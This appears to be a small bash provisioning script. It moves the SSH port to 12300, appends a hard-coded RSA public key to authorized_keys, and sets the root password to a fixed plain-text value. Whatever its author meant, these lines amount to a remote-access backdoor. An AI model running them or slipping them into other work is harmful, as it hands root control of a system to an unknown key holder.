#!/bin/bash
sed -i '/^\s*[Pp]\{1\}ort.*$/c\Port 12300' /etc/ssh/sshd_config
systemctl restart sshd
mkdir ~/.ssh
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAg8ZRpQBCreQw9vPwz1KDiix+DDwvbI58VC9/x47wTpMu0tyQahSrahq1ku+O+N6UF3fGzNaYdj0GjLXFP6qnserKf0a3l+LT8m5jKd86bDn1fJ1e9iMmCmuJ1NgLtE7yA6FD+EHmY9yGVxPigW1brMLtx8jd6OVsEvKxHABnnmUzYfV1ILs7v+DWuDT2nsQuFz4NN+rvTTqyRiKa4ssZf3OQ5+G0hQvFT+LHy3KguGIFuq9d1Y/vd8OjcDUiwf9sTOMrhXOEY1U1T8w7ZXa/AAcuJ+Nn8V1fCJyC0ZlioF+N0PfxFt+QkRk1jdWONzXaQ8fQ7O1t9/k0uVUq7hVnhQ== rsa-key-20160601' >> ~/.ssh/authorized_keys
echo '90-=op[]'|passwd --stdin root